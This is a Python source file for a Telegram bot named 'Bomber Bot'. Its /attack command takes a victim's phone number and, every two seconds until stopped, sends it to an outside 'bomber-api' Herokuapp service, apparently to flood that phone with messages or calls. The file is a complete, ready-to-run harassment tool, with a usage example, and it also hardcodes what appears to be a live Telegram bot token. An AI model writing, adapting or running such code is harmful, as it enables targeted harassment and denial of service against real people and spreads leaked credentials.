import os
import json
import requests
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import asyncio
from datetime import datetime

# Bot Token - यहाँ अपना token डालें
BOT_TOKEN = "8098475949:AAHZhzAivOXv2lN_GSSMjuP9hXSUHljStiY"

# Setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

active_attacks = {}
API_URL = "https://bomber-api-b65587ad9efc.herokuapp.com/start"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Hello! I'm Bomber Bot\n\n"
        "Commands:\n"
        "/attack [number] - Start attack\n"
        "/stop - Stop attack\n"
        "Example: /attack 8859027788"
    )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    
    if chat_id in active_attacks:
        await update.message.reply_text("❌ Already attacking! Use /stop first")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /attack 8859027788")
        return
    
    phone = context.args[0]
    
    # Start attack
    active_attacks[chat_id] = {
        'phone': phone,
        'active': True,
        'task': None
    }
    
    await update.message.reply_text(f"🚀 Attack started on {phone}")
    
    # Background task
    async def send_requests():
        while chat_id in active_attacks and active_attacks[chat_id]['active']:
            try:
                response = requests.post(API_URL, json={"phone": phone})
                timestamp = datetime.now().strftime("%H:%M:%S")
                
                if response.status_code == 200:
                    await update.message.reply_text(f"✅ {timestamp} - Request sent to {phone}")
                else:
                    await update.message.reply_text(f"⚠️ {timestamp} - Error: {response.status_code}")
            
            except Exception as e:
                logger.error(f"Error: {e}")
            
            await asyncio.sleep(2)  # 2 seconds delay
    
    task = asyncio.create_task(send_requests())
    active_attacks[chat_id]['task'] = task

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    
    if chat_id in active_attacks:
        active_attacks[chat_id]['active'] = False
        phone = active_attacks[chat_id]['phone']
        del active_attacks[chat_id]
        await update.message.reply_text(f"🛑 Stopped attack on {phone}")
    else:
        await update.message.reply_text("❌ No active attack")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("stop", stop))
    
    print("Bot starting...")
    app.run_polling()

if __name__ == "__main__":
    main()
